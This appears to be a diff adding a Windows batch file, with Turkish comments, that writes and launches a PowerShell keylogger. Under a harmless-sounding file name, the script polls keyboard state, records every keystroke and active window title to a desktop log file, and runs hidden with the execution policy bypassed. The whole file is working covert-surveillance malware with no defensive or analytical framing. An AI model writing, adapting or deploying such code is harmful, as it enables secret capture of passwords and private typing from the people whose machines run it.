@@ -1,0 +1,51 @@
+@echo off
+set "psScript=%temp%\sys_check_logic.ps1"
+set "logFile=%USERPROFILE%\Desktop\test_log.txt"
+
+:: PowerShell betiğini oluştur
+echo $signature = @' > "%psScript%"
+echo [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey); >> "%psScript%"
+echo [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); >> "%psScript%"
+echo [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount); >> "%psScript%"
+echo [DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags); >> "%psScript%"
+echo [DllImport("user32.dll")] public static extern bool GetKeyboardState(byte[] lpKeyState); >> "%psScript%"
+echo [DllImport("user32.dll")] public static extern uint MapVirtualKey(uint uCode, uint uMapType); >> "%psScript%"
+echo '@ >> "%psScript%"
+
+echo $api = Add-Type -MemberDefinition $signature -Name 'Win32' -Namespace 'API' -PassThru >> "%psScript%"
+echo $lastTitle = '' >> "%psScript%"
+
+echo while($true) { >> "%psScript%"
+echo     $hWnd = $api::GetForegroundWindow() >> "%psScript%"
+echo     $titleBuilder = New-Object System.Text.StringBuilder 256 >> "%psScript%"
+echo     if ($api::GetWindowText($hWnd, $titleBuilder, 256) -gt 0) { >> "%psScript%"
+echo         $currentTitle = $titleBuilder.ToString() >> "%psScript%"
+echo         if ($currentTitle -ne $lastTitle) { >> "%psScript%"
+echo             $lastTitle = $currentTitle >> "%psScript%"
+echo             Add-Content -Path '%logFile%' -Value "`n`n[Pencere: $currentTitle] - $(Get-Date -Format 'HH:mm:ss')`n" -Encoding UTF8 >> "%psScript%"
+echo         } >> "%psScript%"
+echo     } >> "%psScript%"
+echo     for($i=1; $i -le 255; $i++) { >> "%psScript%"
+echo         if($api::GetAsyncKeyState($i) -eq -32767) { >> "%psScript%"
+echo             $out = '' >> "%psScript%"
+echo             if ($i -eq 13) { $out = ' [ENTER] ' } >> "%psScript%"
+echo             elseif ($i -eq 8) { $out = ' [BckSpc] ' } >> "%psScript%"
+echo             elseif ($i -eq 9) { $out = ' [TAB] ' } >> "%psScript%"
+echo             else { >> "%psScript%"
+echo                 $keyState = New-Object byte[] 256 >> "%psScript%"
+echo                 $api::GetKeyboardState($keyState) ^| Out-Null >> "%psScript%"
+echo                 $sb = New-Object System.Text.StringBuilder 5 >> "%psScript%"
+echo                 $scanCode = $api::MapVirtualKey($i, 0) >> "%psScript%"
+echo                 $result = $api::ToUnicode($i, $scanCode, $keyState, $sb, $sb.Capacity, 0) >> "%psScript%"
+echo                 if ($result -gt 0) { $out = $sb.ToString() } >> "%psScript%"
+echo             } >> "%psScript%"
+echo             if ($out) { Add-Content -Path '%logFile%' -Value $out -NoNewline -Encoding UTF8 } >> "%psScript%"
+echo         } >> "%psScript%"
+echo     } >> "%psScript%"
+echo     Start-Sleep -Milliseconds 15 >> "%psScript%"
+echo } >> "%psScript%"
+
+:: Gizli başlat
+start /b powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%psScript%"
+echo Loglama basladi. @, #, ?, gibi tum karakterler artik destekleniyor.
+pause
